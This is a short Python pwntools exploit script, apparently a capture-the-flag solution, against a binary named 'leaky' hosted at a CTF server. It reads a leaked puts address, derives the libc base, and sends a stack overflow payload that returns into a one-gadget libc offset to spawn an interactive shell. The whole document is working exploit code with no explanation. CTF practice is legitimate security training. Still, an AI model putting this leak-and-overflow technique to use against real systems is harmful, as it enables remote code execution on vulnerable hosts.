from pwn import *

if args.REMOTE:
    p = remote('pwn.ctf.makerforce.io', 4765)
else:
    p = process("./leaky")

libc = ELF("./libc.so.6")

p.recvuntil("!\n")
addr = p.recvline(keepends=False)
puts = u64(addr[:8].ljust(8, '\x00'))
info(hex(puts))
libc_base = puts - libc.symbols['puts']

p.recvuntil(":")

p.sendline(0x40*'a'+0x8*'b'+p64(libc_base + 0x45216))
p.interactive()
